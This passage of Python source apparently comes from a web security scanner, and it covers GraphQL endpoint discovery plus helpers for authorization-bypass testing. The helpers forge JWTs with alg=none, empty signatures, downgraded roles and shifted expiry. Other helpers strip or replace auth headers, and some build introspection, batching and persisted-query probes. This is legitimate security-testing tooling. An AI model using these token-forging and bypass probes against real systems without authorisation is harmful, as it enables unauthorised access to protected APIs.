            GraphQLAuthBypassProber(session=self.session, results=self.results),
            GraphQLPersistedQueryBypassProber(session=self.session, results=self.results),
        ]
        for prober in extended_probers:
            prober.run(url, endpoints=endpoints)
            # Merge counts from extended probers into vulns total
            bucket_results = self.results.get(prober.name, [])
            vulns += len(bucket_results)

        self.set_summary(bucket, vulns)
        return self.results

    def _discover_endpoints(self, base: str) -> List[str]:
        found = []
        if "graphql" in base or "gql" in base:
            return [base]
        
        # [WS3] Enhanced Probing: GET & POST
        common_paths = [
            "/graphql", "/api/graphql", "/v1/graphql", "/graphql/console", "/graphiql",
            "/v1/api/graphql", "/api/v1/graphql", "/gql"
        ]
        
        for p in common_paths:
            target = base.rstrip("/") + p
            try:
                # 1. GET with introspection query
                r = self.session.get(target, params={"query": "{__typename}"}, timeout=5)
                if r.status_code == 200 and ("data" in r.text or "errors" in r.text):
                    found.append(target)
                    continue
                
                # 2. POST with empty query or typename
                r_post = self.session.post(target, json={"query": "{__typename}"}, timeout=5)
                # BUG FIX: was checking r.text (GET response) instead of r_post.text
                if r_post.status_code == 200 and ("data" in r_post.text or "errors" in r_post.text):
                    found.append(target)
                elif r_post.status_code == 400 and "graphql" in r_post.text.lower():
                    # If it says "Bad Request: GraphQL query missing", it's an endpoint!
                    found.append(target)
            except Exception as exc:
                logger.debug(f"[GraphQL] Endpoint discovery request failed for {target}: {exc!r}")
        return list(set(found))


def run(target: str, session=None, results: dict = None, debug: bool = False, **kwargs):
    scanner = GraphQLScanner(session=session, results=results or {}, debug=debug)
    return scanner.run(target, **kwargs)



# ===========================================================================
# MERGED FROM: websecure/core/graphql_utils.py
# GraphQL helpers: JWT utils, batching, APQ, authz diff matrix, suggestion parser
# ===========================================================================
import base64
import hashlib as _hl
from typing import Iterator

# ---------------------------------------------------------------------------
# Basit auth yardımcıları (cookie + header snapshot/drop)
# ---------------------------------------------------------------------------

SUSPECT_COOKIE_KEYS = {"session", "sid", "auth", "jwt", "token"}

_B64URL_RE = re.compile(r"^[A-Za-z0-9_\-]*$")


def _is_valid_b64url(s: str) -> bool:
    return bool(_B64URL_RE.match(s or ""))


def _safe_b64url_decode(data: str) -> bytes:
    """
    Base64url padding'i normalize edip decode eder.
    Geçersiz karakter varsa boş byte döner (sessiz fallback, hata yükseltmez).
    """
    s = data or ""
    if not _is_valid_b64url(s):
        return b""
    s = s + "=" * (-len(s) % 4)
    try_bytes = base64.urlsafe_b64decode(s.encode("utf-8"))
    # base64.urlsafe_b64decode, regex ile doğrulandıktan sonra tipik olarak hata yükseltmez
    return try_bytes


def _safe_b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def extract_auth_snapshot(session) -> Dict[str, Any]:
    """Session üzerindeki Authorization header ve şüpheli cookie'leri yakala."""
    headers = getattr(session, "headers", {}) or {}
    auth = headers.get("Authorization")
    ck: Dict[str, str] = {}

    jar = getattr(session, "cookies", None)
    if jar is not None:
        for c in list(jar):
            name = (getattr(c, "name", "") or "").lower()
            if name in SUSPECT_COOKIE_KEYS:
                ck[getattr(c, "name", "")] = getattr(c, "value", "")

    return {"auth_header": auth, "cookies": ck}


class _DropAuth:
    """Authorization ve şüpheli cookie’leri geçici kaldıran context manager (try/finally yok)."""
    def __init__(self, session):
        self._s = session
        snap = extract_auth_snapshot(session)
        self._prev_auth = snap.get("auth_header")
        self._suspects = list((snap.get("cookies") or {}).keys())

    def __enter__(self):
        headers = getattr(self._s, "headers", None)
        if isinstance(headers, dict) and "Authorization" in headers:
            headers.pop("Authorization")
        jar = getattr(self._s, "cookies", None)
        if jar is not None:
            for name in self._suspects:
                # requests CookieJar set(name, None) temizler
                jar.set(name, None)
        return self

    def __exit__(self, exc_type, exc, tb):
        headers = getattr(self._s, "headers", None)
        if isinstance(headers, dict):
            if self._prev_auth is None:
                headers.pop("Authorization", None)
            else:
                headers["Authorization"] = self._prev_auth
        # Cookie'leri tam restore etmek genelde mümkün değil; üst katman login akışı tekrar ayarlar.
        return False  # istisnaları bastırmaz


def drop_auth(session) -> Iterator[None]:
    """Authorization header ve şüpheli cookie'leri geçici kaldır (context manager döner)."""
    return _DropAuth(session)  # type: ignore[return-value]


def set_invalid_token(session, token: str = "Bearer invalid.invalid.invalid"):
    """Geçersiz token yerleştir (önceki Authorization'u override eder)."""
    headers = getattr(session, "headers", None)
    if isinstance(headers, dict):
        headers["Authorization"] = token


# ---------------------------------------------------------------------------
# JWT işlevleri — parse/compose ve varyasyon üretimi
# ---------------------------------------------------------------------------

def _json_loads_or_empty(b: bytes) -> Dict[str, Any]:
    """
    Basit ve güvenli JSON decode: içeriğin { ile başladığına bakarak dener,
    aksi halde {} döner. Hata yükseltmez.
    """
    if not b:
        return {}
    s = b.decode("utf-8", "ignore").strip()
    if not (s.startswith("{") and s.endswith("}")):
        return {}
    # JSON hatası yükselirse bastırmayız; ancak yukarıdaki guard ile tipik hataları engelledik.
    return json.loads(s)


@dataclass
class JWTParts:
    header_raw: str
    payload_raw: str
    signature_raw: str

    @property
    def header(self) -> Dict[str, Any]:
        return _json_loads_or_empty(_safe_b64url_decode(self.header_raw))

    @property
    def payload(self) -> Dict[str, Any]:
        return _json_loads_or_empty(_safe_b64url_decode(self.payload_raw))

    def as_compact(self) -> str:
        return ".".join([self.header_raw, self.payload_raw, self.signature_raw])


def parse_bearer_jwt_from_session(session) -> Optional[JWTParts]:
    """Session.Authorization içinden JWT ayıkla (Bearer <token>)."""
    headers = getattr(session, "headers", {}) or {}
    auth = headers.get("Authorization") or ""
    if not isinstance(auth, str) or not auth.lower().startswith("bearer "):
        return None
    token = auth.split(" ", 1)[1].strip()
    parts = token.split(".")
    if len(parts) != 3:
        return None
    return JWTParts(*parts)


def compose_jwt_unverified(header: Dict[str, Any], payload: Dict[str, Any], signature: Optional[str] = "") -> str:
    """
    İmza doğrulaması yapmadan JWT compact string üret.
    - signature None ise boş imza (alg=none senaryosu) üretir.
    - signature "" (default) ise 3. parça boş bırakılır.
    """
    h_raw = _safe_b64url_encode(json.dumps(header, separators=(",", ":"), ensure_ascii=False).encode("utf-8"))
    p_raw = _safe_b64url_encode(json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8"))
    s_raw = signature if signature is not None else ""
    return ".".join([h_raw, p_raw, s_raw])


def bearer(token: str) -> str:
    return f"Bearer {token}"


def _try_mutate_roles(payload: Dict[str, Any]) -> Dict[str, Any]:
    """
    Rol/Scope içeren yaygın claim adları:
    - 'role', 'roles' (dize veya liste)
    - 'scope' (boşluk ayrımlı dizge), 'scopes' (liste)
    - 'permissions' (liste)
    Bu fonksiyon *rol düşürme* yapar: admin->user->guest; scope/permission'ları daraltır.
    """
    p = json.loads(json.dumps(payload))  # deep copy

    # Tekil rol
    if isinstance(p.get("role"), str):
        p["role"] = "guest"

    # Liste roller
    if isinstance(p.get("roles"), list):
        new_roles = [r for r in p["roles"] if str(r).lower() in {"guest", "user"}]
        if not new_roles:
            new_roles = ["guest"]
        p["roles"] = new_roles

    # scope dizge (space-separated)
    if isinstance(p.get("scope"), str):
        scopes = [s for s in p["scope"].split() if s.lower() in {"read"}]
        p["scope"] = " ".join(scopes or ["read"])

    # scopes liste
    if isinstance(p.get("scopes"), list):
        p["scopes"] = [s for s in p["scopes"] if str(s).lower() in {"read"}] or ["read"]

    # permissions
    if isinstance(p.get("permissions"), list):
        keep = {"read", "view", "basic", "self"}
        p["permissions"] = [x for x in p["permissions"] if str(x).lower() in keep] or ["read"]

    # opsiyonel tier
    p["tier"] = "free"

    return p


def _set_exp(payload: Dict[str, Any], delta_seconds: int) -> Dict[str, Any]:
    p = json.loads(json.dumps(payload))  # deep copy
    p["exp"] = int(_t.time()) + delta_seconds
    return p


def jwt_role_downgrade_variants(session) -> Dict[str, str]:
    """
    Session'daki JWT'yi baz alarak çeşitli varyasyonlar döndürür:
      - alg=none + rol düşürme
      - mevcut header alg korunarak sadece payload rol düşürme (imza korunamaz; boş bırakılır)
      - token'ı 'expired' yapma (exp geçmişte)
      - token'ı 'far-future' yapma (exp ileriye)
    Dönen değerler Bearer prefix içeren header değeridir.
    """
    parts = parse_bearer_jwt_from_session(session)
    if not parts:
        return {}

    h = parts.header or {}
    p = parts.payload or {}

    # 1) alg=none + rol düşürme
    h_none = dict(h)
    h_none["alg"] = "none"
    p_downgraded = _try_mutate_roles(p)
    tok_none = compose_jwt_unverified(h_none, p_downgraded, signature=None)

    # 2) alg korunur; imza boş (çoğu sunucu reddeder ama hatalılar ayırt edilebilir)
    tok_sigless = compose_jwt_unverified(h, p_downgraded, signature="")

    # 3) expired
    tok_expired = compose_jwt_unverified(h_none, _set_exp(p_downgraded, -3600), signature=None)

    # 4) far future
    tok_future = compose_jwt_unverified(h_none, _set_exp(p_downgraded, +365 * 24 * 3600), signature=None)

    return {
        "none_alg_downgraded": bearer(tok_none),
        "sigless_downgraded": bearer(tok_sigless),
        "expired_downgraded": bearer(tok_expired),
        "future_downgraded": bearer(tok_future),
    }


class _WithJWTHeader:
    """Authorization header'ı geçici override eden context manager."""
    def __init__(self, session, authorization_value: str):
        self._s = session
        self._val = authorization_value
        self._prev = getattr(getattr(session, "headers", {}), "get", lambda *_: None)("Authorization")

    def __enter__(self):
        headers = getattr(self._s, "headers", None)
        if isinstance(headers, dict):
            headers["Authorization"] = self._val
        return self

    def __exit__(self, exc_type, exc, tb):
        headers = getattr(self._s, "headers", None)
        if isinstance(headers, dict):
            if self._prev is None:
                headers.pop("Authorization", None)
            else:
                headers["Authorization"] = self._prev
        return False  # istisnaları bastırmaz


def with_jwt_header(session, authorization_value: str) -> Iterator[None]:
    """Authorization header'ı geçici override eder (context manager döner)."""
    return _WithJWTHeader(session, authorization_value)  # type: ignore[return-value]


# ---------------------------------------------------------------------------
# GraphQL batching ve sorgu yardımcıları
# ---------------------------------------------------------------------------

def batch_payload(operations: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    GraphQL HTTP batching (array of operations).
    Örnek operasyon:
      {"query": "query A($id:ID!){node(id:$id){id}}", "variables":{"id":"123"}, "operationName":"A"}
    """
    return operations


def build_operation(query: str, variables: Optional[Dict[str, Any]] = None, operation_name: Optional[str] = None) -> Dict[str, Any]:
    op: Dict[str, Any] = {"query": query}
    if variables is not None:
        op["variables"] = variables
    if operation_name:
        op["operationName"] = operation_name
    return op


def alias_collision_query() -> Dict[str, Any]:
    """Aynı alias iki farklı field için kullanılır; spec'e göre hata vermeli."""
    q = "query C { a: __typename a: __typename }"
    return {"query": q}


def introspection_query(minimal: bool = True) -> Dict[str, Any]:
    """Minimal introspection (şema hash’i için faydalı) veya genişletilmiş."""
    if minimal:
        q = "query I { __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind } directives { name } } }"
    else:
        q = "query I { __schema { types { name kind fields { name type { kind name ofType { kind name } } } } } }"
    return {"query": q, "operationName": "I"}


def current_user_probe() -> Dict[str, Any]:
    """Yaygın bir self endpoint'i. Yoksa hata dönebilir; yine de authz farkını anlarız."""
    q = "query Me { me { id username email role roles } }"
    return {"query": q, "operationName": "Me"}


def build_probe_batch(include_me: bool = True, extended_introspection: bool = False) -> List[Dict[str, Any]]:
    """
    HTTP batch içinde karşılaştırılacak temel probeler.
    """
    ops = [introspection_query(minimal=not extended_introspection)]
    if include_me:
        ops.append(current_user_probe())
    ops.append(alias_collision_query())
    return batch_payload(ops)


# ---------------------------------------------------------------------------
# Authz farklarını kıyaslamak için test matrisi
# ---------------------------------------------------------------------------

@dataclass
class RequestPlan:
    label: str
    headers: Dict[str, str]
    body: Any  # dict veya list (batch)

    def as_tuple(self) -> Tuple[str, Dict[str, str], Any]:
        return self.label, self.headers, self.body


def build_authz_diff_matrix(session, base_endpoint_headers: Optional[Dict[str, str]] = None,
                            include_me: bool = True, extended_introspection: bool = False) -> List[RequestPlan]:
    """
    Aynı GraphQL batch'i farklı auth bağlamlarında gönderme planı üretir.
    Üst katman HTTP istemcisi bu planı döngüyle POST edebilir.
    Dönüş: [RequestPlan]
    """
    base_headers = dict(base_endpoint_headers or {})
    batch = build_probe_batch(include_me=include_me, extended_introspection=extended_introspection)

    plans: List[RequestPlan] = []

    # 0) Orijinal Authorization ile
    h0 = dict(base_headers)
    session_headers = getattr(session, "headers", {}) or {}
    if "Authorization" in session_headers:
        h0["Authorization"] = session_headers["Authorization"]
    plans.append(RequestPlan("auth_original", h0, batch))

    # 1) Auth düşürülmüş (alg=none vb.)
    variants = jwt_role_downgrade_variants(session)
    for key, authv in variants.items():
        h = dict(base_headers)
        h["Authorization"] = authv
        plans.append(RequestPlan(f"auth_{key}", h, batch))

    # 2) Geçersiz token
    h_invalid = dict(base_headers)
    h_invalid["Authorization"] = "Bearer invalid.invalid.invalid"
    plans.append(RequestPlan("auth_invalid", h_invalid, batch))

    # 3) No-auth
    plans.append(RequestPlan("no_auth", dict(base_headers), batch))

    return plans


# ---------------------------------------------------------------------------
# Basit diff yardımı: JSON gövdeleri/şema hash’i
# ---------------------------------------------------------------------------

def stable_schema_fingerprint(introspection_json: Dict[str, Any]) -> str:
    """
    Çok büyük şemaları kıyaslarken kolaylık için basit bir fingerprint.
    (Tür adlarını ve kind alanını alfabetik olarak normalize eder.)
    """
    data = introspection_json.get("data") if isinstance(introspection_json, dict) else None
    schema = data.get("__schema") if isinstance(data, dict) else None
    types = schema.get("types") if isinstance(schema, dict) else None
    if not isinstance(types, list):
        return ""
    simplified = sorted(
        [{"name": t.get("name"), "kind": t.get("kind")} for t in types if isinstance(t, dict)],
        key=lambda x: ((x.get("kind") or ""), (x.get("name") or "")),
    )
    blob = json.dumps(simplified, separators=(",", ":"), ensure_ascii=False)
    return _safe_b64url_encode(blob.encode("utf-8"))


# ---------------------------------------------------------------------------
# [WS3-ANCHOR] GraphQL helpers (alias set, APQ, introspection detect)
# ---------------------------------------------------------------------------

def build_alias_set(fields: List[str]) -> str:
    """a0:field0 a1:field1 ..."""
    return " ".join([f"a{i}:{f}" for i, f in enumerate(fields or [])])


def is_introspection_disabled(text: str) -> bool:
    t = (text or "").lower()
    return ("introspection" in t and "disable" in t) or "insufficient permissions for introspection" in t


def make_apq_extensions_sha(query: str, version: int = 1) -> Dict[str, Any]:
    sha = _hl.sha256((query or "").encode()).hexdigest()
    return {"persistedQuery": {"version": int(version), "sha256Hash": sha}}


# ---------------------------------------------------------------------------
# APQ helpers: POST/GET payloads
# ---------------------------------------------------------------------------

def apq_post_payload(query: str, version: int = 1) -> Dict[str, Any]:
    return {
        "query": query,
        "extensions": make_apq_extensions_sha(query, version)
    }


def apq_get_params(query: str, version: int = 1) -> Dict[str, Any]:
    return {
        "extensions": json.dumps(make_apq_extensions_sha(query, version)),
        "query": query
    }


def apq_only_hash(version: int = 1, sha: Optional[str] = None) -> Dict[str, Any]:
    return {
        "extensions": {"persistedQuery": {"version": int(version), "sha256Hash": sha or make_apq_extensions_sha('')['persistedQuery']['sha256Hash']}},
        "query": None
    }


# ---------------------------------------------------------------------------
# Suggestion parser consolidator (server-dependent phrasing)
# ---------------------------------------------------------------------------

_SUG_PATTERNS = [
    r'Did you mean\s+"([^"]+)"',
    r'did you mean\s+"([^"]+)"',
    r'Did you mean\s+(\[.*?\])',
    r"Unknown (?:type|argument|field).*?(?:Did you mean|did you mean)[:\s]+([A-Za-z0-9_,\s\"']+)",
    r"Suggestions?:\s*(\[.*?\])",
    r'Perhaps you meant\s+"([^"]+)"',
    r'Known argument.*?Did you mean\s+"([^"]+)"',
]


def _split_list_literal(s: str) -> List[str]:
    """JSON'a başvurmadan [a,b,'c'] benzeri listeleri kaba biçimde ayrıştır."""
    inner = s.strip()
    if not (inner.startswith("[") and inner.endswith("]")):
        return []
    inner = inner[1:-1]
    parts = [p.strip() for p in inner.split(",")]
    out: List[str] = []
    for p in parts:
        # çevreleyen tek/çift tırnakları temizle
        if (p.startswith('"') and p.endswith('"')) or (p.startswith("'") and p.endswith("'")):
            p = p[1:-1]
        p = p.strip()
        if p:
            out.append(p)
    return out


def parse_suggestions(msg: str) -> List[str]:
    raw: List[str] = []
    for pat in _SUG_PATTERNS:
        for m in re.finditer(pat, msg or "", re.IGNORECASE | re.DOTALL):
            raw.append(m.group(1))

    # normalize
    out: List[str] = []
    for s in raw:
        ss = (s or "").strip()
        if not ss:
            continue
        if ss.startswith("[") and ss.endswith("]"):
            out.extend(_split_list_literal(ss))
        else:
            out.append(ss.strip(" '\""))

    # unique preserve order
    uniq: List[str] = []
    for x in out:
        if x and x not in uniq:
            uniq.append(x)
    return uniq


__all__ = [
    # cookie/header helpers
    "extract_auth_snapshot",
    "drop_auth",
    "set_invalid_token",
    "with_jwt_header",
    # jwt utils
    "JWTParts",
    "parse_bearer_jwt_from_session",
    "compose_jwt_unverified",
    "jwt_role_downgrade_variants",
    "bearer",
    # gql ops
    "batch_payload",
    "build_operation",
    "alias_collision_query",
    "introspection_query",
    "current_user_probe",
    "build_probe_batch",
    "build_alias_set", "is_introspection_disabled", "make_apq_extensions_sha",
    # authz diff
    "RequestPlan",
    "build_authz_diff_matrix",
    # schema fingerprint
    "stable_schema_fingerprint",
    # APQ helpers
    "apq_post_payload",
    "apq_get_params",
    "apq_only_hash",
    # suggestion helpers
    "parse_suggestions",
]